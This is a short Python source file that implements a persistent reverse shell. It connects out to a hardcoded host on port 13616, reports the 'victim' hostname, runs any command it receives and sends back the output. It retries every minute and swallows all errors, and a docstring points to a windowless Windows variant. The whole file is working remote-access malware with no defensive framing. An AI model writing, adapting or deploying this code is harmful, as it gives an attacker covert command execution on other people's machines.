"""
This shell works on both Linux & Windows
However, meepshell2.pyw is recommended for Windows
"""

import socket
import subprocess
import time


def main():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            hostname = "meep.student.rit.edu"
            ip = socket.gethostbyname(hostname)
            port = 13616
            s.connect((ip, port))
            s.send("meepster".encode())
            victimhost = subprocess.getoutput("hostname")
            time.sleep(1)
            s.send(victimhost.encode())
            while True:
                try:
                    command = s.recv(2048).decode()
                    if command == "":
                        break
                    output = 'Output: \n'
                    output += subprocess.getoutput(command)
                    s.send(output.encode())
                except socket.timeout:
                    pass
                except:
                    break
        except:
            pass
        time.sleep(60)


if __name__ == "__main__":
    main()
